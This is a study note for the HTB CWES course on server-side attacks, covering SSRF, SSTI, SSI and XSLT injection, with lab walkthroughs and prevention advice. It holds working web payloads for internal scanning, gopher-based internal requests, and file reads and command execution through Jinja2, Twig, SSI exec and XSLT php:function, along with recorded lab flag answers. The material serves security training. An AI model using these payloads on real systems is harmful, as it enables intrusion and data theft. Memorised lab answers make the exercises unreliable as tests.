---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "2"
source_file: "CWES.xmind"
---

# Server-side Attacks

## Study Companion

### Prerequisites

HTTP requests, server-side rendering concepts, and basic network services.

### Learning Outcomes

- Differentiate SSRF, SSTI, SSI injection, and XSLT injection.
- Fingerprint the relevant protocol, template engine, directive processor, or XSLT implementation.
- Progress from harmless identification to a bounded impact proof.

### Practice Checkpoint

For one server-side feature, document input, processing engine, safe fingerprint, reachable resources, and remediation.

### Related Knowledge Map

- [[Maps/Files and Server-side Attacks|Files and Server-side Attacks]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Assess server-side request, template, include, and transformation features for SSRF, SSTI, SSI injection, and XSLT injection, progressing from safe identification to clearly bounded proof of internal access, information disclosure, file read, or command execution.

### Assessment Workflow
1. Map features that fetch URLs, render templates, create `.shtml`-style content, or transform XML/XSL; capture request formats, reflection points, errors, and server-side technologies.
2. For SSRF, direct the fetch to an authorized listener, determine whether responses are reflected or blind, then test loopback/internal hosts, bounded ports, paths, and allowed schemes; use `file` or `gopher` only when explicitly in scope.
3. For SSTI, inject harmless syntax and arithmetic probes, fingerprint the engine through documented behavioral differences, and enumerate configuration or template context before any file-read or command-execution proof.
4. For SSI, confirm directive processing with non-destructive output such as environment or date variables before assessing include or `exec` behavior.
5. For XSLT, use syntax errors and `system-property()` to identify the processor/version, then test only functions actually supported for controlled file read or command execution.
6. Validate mitigations: hardcoded SSRF destination allowlists and protocol restrictions, network egress segmentation, separation of data from template/XSL instructions, sandboxed renderers, disabled SSI execution, output encoding, and safe error handling.

### Key Testing Principles
- Fingerprint first; payloads and impact depend on the URL scheme, template engine, SSI configuration, and XSLT processor/version.
- Separate reflected from blind SSRF and use consistent response-size, message, timing, or out-of-band evidence to avoid false positives.
- Treat automated tools as corroboration, not proof; deprecated or engine-specific tooling can misclassify targets.
- Keep internal enumeration bounded and never use destructive requests, broad scans, or persistent command execution outside the agreed authorization.

### Evidence and Reporting
Capture the exact input-to-sink path, baseline and probe requests, callback logs or response differentials, identified engine/library, and the least-impactful disclosure or execution result. Explain prerequisites and network reachability, separate each vulnerability from any exploit chain, and recommend application-layer validation plus network isolation, sandboxing, disabled dangerous features, patched dependencies, and monitored outbound traffic.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **48 yellow/output topics** in this module.

- [[Outputs/Modules/Server-side Attacks Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## Server-Side Request Forgery - SSRF

### URL schemes

- http://
- file://
- gopher://
### Identifying SSRF

- functionality to schedule appointments
  - POST /index.php HTTP/1.1  
    Host: 172.17.0.2  
    Content-Type: application/x-www-form-urlencoded  
    dateserver=http://dateserver.htb/availability.php&date=2024-01-01
  - put our listener
    - nc -lnvp 8000
    - dateserver=http://172.16.0.10:8000/ssrf
      - GET /ssrf HTTP/1.1  
        Host: 172.17.0.10:8000  
        Accept: */*
  - determine whether the HTTP response reflects the SSRF
    - point the web application to itself
      - dateserver=http://127.0.0.1/index.php
        - <title>  
          DefendTech Innovations  
          </ title>  
          </head>
  - Enumerating the System
    - conduct a port scan
      - dateserver=http://127.0.0.1:81
        - Failed to connect to port 81
      - We can do this using a fuzzer like ffuf
        - Create ports wordlust
          - seq 1 10000 > ports.txt
        - ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
          - 80
          - 3306
- LAB
  - Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag.
    - ffuf -u http://10.129.201.127 -w ports.txt -X POST -d 'dateserver=http://127.0.0.1:FUZZ&date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded'  -fr "Failed to connect to"
      - 80
      - 3306
      - 8000
    - in the same Post request
      - dateserver=http://127.0.0.1:8000&date=2024-01-01
        - HTB{911fc5badf7d65aed95380d536c270f8}
### Exploiting SSRF

- directory brute-force
  - ffuf
    - ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
      - admin
      - availability
- Local File Inclusion (LFI)
  - file:///etc/passwd.
- The gopher Protocol
  - http issue
    - we are restricted to GET requests as there is no way to send a POS
      - Assuming we identified the internal endpoint /admin.php
        - admin endpoint is protected by a login prompt
  - use the gopher URL scheme to send arbitrary bytes to a TCP socket
    - enables us to create a POST
  - try common weak passwords, such as admin
    - send the following POST
      - POST /admin.php HTTP/1.1  
        Host: dateserver.htb  
        Content-Length: 13  
        Content-Type: application/x-www-form-urlencoded  
        adminpw=admin
        - We need to URL-encode all special characters to construct a valid gopher URL
          - gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
            - HTTP POST
              - POST /index.php HTTP/1.1  
                Host: 172.17.0.2  
                Content-Length: 265  
                Content-Type: application/x-www-form-urlencoded  
                dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
                - <h1>  
                  Admin Dashboard  
                  </h1>
  - utilize the tool Gopherus to generate gopher URLs for us
    - <https://github.com/tarunkant/Gopherus>
      - MySQL  
        PostgreSQL  
        FastCGI  
        Redis  
        SMTP  
        Zabbix  
        pymemcache  
        rbmemcache  
        phpmemcache  
        dmpmemcache
        - gopherus --exploit smtp
        - python2.7 gopherus.py --exploit smtp
          - Mail from :  attacker@academy.htb
          - Mail To :  victim@academy.htb
          - Subject :  HelloWorld
          - Message :  Hello from SSRF!
          - Your gopher link is ready to send Mail:
            - gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb...
- LAB
  - visit non existing page
    - dateserver=http://dateserver.htb/img.php&date=2024-01-01
      - 404 Not Found
  - Directory Brute force
    - ffuf -u http://10.129.201.127 -w /opt/useful/seclists/Discovery/Web-Content/raft-small-words.txt -X POST -d 'dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded'  -fr "404 Not Found"
      - admin
  - visit /admin.php
    - dateserver=http://dateserver.htb/admin.php&date=2024-01-01
      - HTB{61ea58507c2b9da30465b9582d6782a1}
### Blind SSRF

- Identifying Blind SSRF
  - Exploiting
    - if port not working
      - dateserver=http://127.0.0.1:81/&date=2024-01-01
        - Something went wrong!
    - if port is working
      - dateserver=http://127.0.0.1:8000/&date=2024-01-01
        - Date is Unavailable
          - diffrent response
    - if file exist
      - dateserver=file:///etc/passwd/&date=2024-01-01
        - Date is Unavailable
    - use burp collaborator with base32 encode to move commands output via dns
### Preventing SSRF

- can be implemented at the web application or network layers.
  - A whitelist prevents an attacker from making unintended requests to internal systems.
    - it should be hardcoded
  - Additionally, the URL scheme and protocol used in the request need to be restricted
  - input sanitization can help prevent unexpected behavior
- <https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html>
## Server-side Template Injection - SSTI

### Template Engines

- The template can dynamically add content, but keep the header and footer the same
  - This avoids duplicate instances of header and footer in different places
- Templating
  - require
    - template
      - string
      - file
    - set of values
      - The values are provided as key-value pairs
  - template syntax
    - Hello {{ name }}!
      - single variable called name
### Identifying SSTI

- similar to the process of identifying any other injection vulnerability, such as SQL injection
  - most effective way is to inject special characters
    - Rayan
      - Hi Rayan
    - ${{<%[%'"}}%\.
      - Internal Server Error
### Identifying the Template Engine

- first need to determine the template engine
- We can utilize slight variations in the behavior of different template engines to achieve this.
  - https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png
    ![[Attachments/f3b63c6164aca279dc3afd2ecbcda146b65cb806ffe6886098df8c9c669dca85.png]]
    - follow the diagram from left to right, depending on the result of the injection.
- start by injecting the payload ${7*7}
  - Hi ${7*7}!
    - Since the injected payload was not executed, we follow the red arrow and now inject the payload {{7*7}}
      - Hi 49
        - follow the green arrow and inject the payload {{7*'7'}}
          - Jinja
            - Hi 7777777
          - Twig
            - Hi 49
- SSTI identify LAB
  - Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer.
    - enter Rayan in the input field
      - Hi Rayan!
        - Enter ${7*7}
          - didnt executed try {{7*7}}
            - executed now determine is it Twig or Jinja by using {{7*'7'}}
              - Hi 49
                - its Twing
### Exploiting SSTI - Jinja2

- used in
  - Jinja is a template engine commonly used in Python web frameworks
    - Flask
    - Django
  - libraries
    - use any libraries that are already imported by the Python application
    - we may be able to import additional libraries through the use of the import statement
- Information Disclosure
  - configuration details
    - {{ config.items() }}
      - in HTTP Request
        - GET /?name=%7B%7B+config.items%28%29+%7D%7D
      - ..secret_key=...
        - prepare further attacks using the obtained information
          - dump all available built-in functions
            - {{ self.__init__.__globals__.__builtins__ }}
              - Local File Inclusion (LFI)
                - {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
              - Remote Code Execution (RCE)
                - {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
                  - Hi uid=0(root)...
- Exploit Jinja - LAB
  - Burp Repeater
    - GET /?name={{+self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()+}}
      - GET /?name={{+self.__init__.__globals__.__builtins__.__import__('os').popen('cat+flag.txt').read()+}}
        - <div>  
          Hi HTB{295649e25b4d852185ba34907ec80643}!<br/><br/>Your IP: 10.30.18.167<br/><br/>Current Time: 2026-01-16 18:37:43<br/><br/>  
          </div>
### Exploiting SSTI - Twig

- Information Disclosure
  - {{ _self }}
- Local File Inclusion (LFI)
  - <https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt>
    - {{ "/etc/passwd"|file_excerpt(1,-1) }}
- Remote Code Execution (RCE)
  - use a PHP built-in function such as system
    - {{ ['id'] | filter('system') }}
      - {{ ['cat /flag.txt'] | filter('system') }}
### SSTI cheat sheets

- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md>
### Tools of the Trade

- most popular tool for identifying and exploiting SSTI vulnerabilities
  - <https://github.com/epinna/tplmap>
    - no longer maintained and runs on the deprecated Python 2 version.
- more modern
  - <https://github.com/vladko312/SSTImap>
    - git clone https://github.com/vladko312/SSTImap
      - pip3 install -r requirements.txt
        - python3 sstimap.py -u http://172.17.0.2/index.php?name=test
          - download a remote file
            - python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
              - [+] File downloaded correctly
          - execute a system command
            - python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
              - uid=33(www-data) gid=33(www-data) groups=33(www-data)
          - interactive shell
            - python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
              - Linux$ whoami
                - www-data
### Prevention

- user input is never passed to the template engine's rendering function
  - This can be achieved by carefully going through the different code paths
- separate the execution environment in which the template engine runs entirely from the web server
  - such as a Docker container
## Server-Side Includes - SSI

### use to create dynamic content on HTML pages

### Typical file extensions

- .shtml, .shtm, and .stm.
  - web servers can be configured to support SSI directives in arbitrary file extensions
    - we cannot conclusively determine whether SSI is used solely based on the file extension.
### SSI Directives

- printenv
  - <!--#printenv -->
    - This directive prints environment variables. It does not take any variables.
- config
  - changes the SSI configuration
    - For instance, it can be used to change the error message using the errmsg parameter
      - <!--#config errmsg="Error!" -->
- echo
  - prints the value of any variable given in the var parameter
    - <!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
      - DOCUMENT_NAME: the current file's name
      - DOCUMENT_URI: the current file's URI
      - LAST_MODIFIED: timestamp of the last modification of the current file
      - DATE_LOCAL: local server time
- exec
  - <!--#exec cmd="whoami" -->
- include
  - <!--#include virtual="index.html" -->
### Exploiting SSI Injection

- enter our name
  - we are redirected to /page.shtml
    - Hi Rayan!
    - We can guess that the page supports SSI based on the file extension
      - confirm this by providing a username of <!--#printenv -->
- execute arbitrary commands using the exec
  - <!--#exec cmd="cat /flag.txt" -->
    - HTB{81e5d8e80eec8e961a31229e4a5e737e}
### Preventing SSI Injection

- validate and sanitize user input
  - it may be possible to disable the exec directive if it is not actively required.
## eXtensible Stylesheet Language Transformation (XSLT)

### some commonly used XSL elements

- <xsl:template>
- <xsl:value-of>
- <xsl:for-each>
### Exploiting XSLT Injection

- At the bottom of the page, we can provide a username
  - Suppose the web application stores the module information in an XML document and displays the data using XSLT processing.
    - providing the username
      - <
        - the web application responds with a server error
- Information Disclosure
  - We can try to infer some basic information about the XSLT processor in use by injecting
    - Version: <xsl:value-of select="system-property('xsl:version')" />  
      <br/>  
      Vendor: <xsl:value-of select="system-property('xsl:vendor')" />  
      <br/>  
      Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />  
      <br/>  
      Product Name: <xsl:value-of select="system-property('xsl:product-name')" />  
      <br/>  
      Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
      - seperate them and send the each line alone to prevent 500 error
      - Hi Version 1.0  
        vendor: libxslt ...
        - this confirms an XSLT injection vulnerability.
        - web application seems to rely on the libxslt library and supports XSLT version 1.0.
- Local File Inclusion (LFI)
  - <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
    - it was only introduced in XSLT version 2.0
      - this sample web application does not support this function
  - if the XSLT library is configured to support PHP functions
    - call the PHP function file_get_contents
      - <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
        - Hi root:x:0...
- Remote Code Execution (RCE)
  - If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command
    - <xsl:value-of select="php:function('system','id')" />
      - <xsl:value-of select="php:function('system','cat /flag.txt')" />
        - Hi HTB{3a4fe85c1f1e2b61cabe9836a150f892},...
### Preventing XSLT Injection

- user input is not inserted into XSL data before it is processed by the XSLT processor.
- implement proper sanitization and input validation
  - HTML-encoding converts all instances of < to &lt; and > to &gt;
    - an attacker should not be able to inject additional XSLT elements
## Skills Assessment

### vist /

- API Request
  - POST / HTTP/1.1  
    Host: 94.237.63.174:33800  
    Connection: keep-alive  
    api=http://truckapi.htb/?id%3DFusionExpress01
    - {"id": "FusionExpress01", "location": "321 Maple Lane"}
- use diffrent protocols schemes
  - api=gopher://127.0.0.1:25/
    - Error (1): Protocol "gopher" not supported or disabled in libcurl
  - api=file:///etc/passwd
    - Error (1): Protocol "file" not supported or disabled in libcurl
- Port scan
  - ffuf -u http://94.237.63.174:33800/ -w ports.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb:FUZZ/" -fr "Failed to connect to truckapi.htb"
    - 80  
      3306
- Directory brute forcing
  - ffuf -u http://94.237.63.174:33800/ -w /opt/useful/seclists/Discovery/Web-Content/raft-small-words.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb/FUZZ" -fr '404 Not Found' -e .php -fs 277
    - vendor
      - ffuf -u http://94.237.63.174:33800/ -w /opt/useful/seclists/Discovery/Web-Content/raft-small-words.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb/vendor/FUZZ" -fr '404 Not Found' -e .php -fs 277
        - autoload.php  
          symfony  
          twig  
          composer
          - nothing seems useful (we know there is twig template engine)
- return to the main API request and play with it
  - replace FusionExpress01
    - api=http://truckapi.htb/?id%3D${7*7}
      - {"id": "${7*7}", "location": "134 Main Street"}
        - api=http://truckapi.htb/?id%3D{{7*7}}
          - {"id": "49", "location": "134 Main Street"}
            - it twig just as we saw in directory brute forcing
- get RCE
  - api=http://truckapi.htb/?id%3D{{+['id']+|+filter('system')+}}
    - Error (3): URL using bad/illegal format or missing URL
      - just remove the spaces
        - api=http://truckapi.htb/?id%3D{{['id']|filter('system')}}
          - {"id": "uid=33(www-data) gid=33(www-data) groups=33(www-data)  
            Array", "location": "134 Main Street"}
            - space is blacklisted even %20 and %09
              - use $IFS to work as space
                - api=http://truckapi.htb/?id%3D{{['cat$IFS/flag.txt']|filter('system')}}
                  - {"id": "HTB{3b8e2b940775e0267ce39d7c80488fc8}Array", "location": "134 Main Street"}
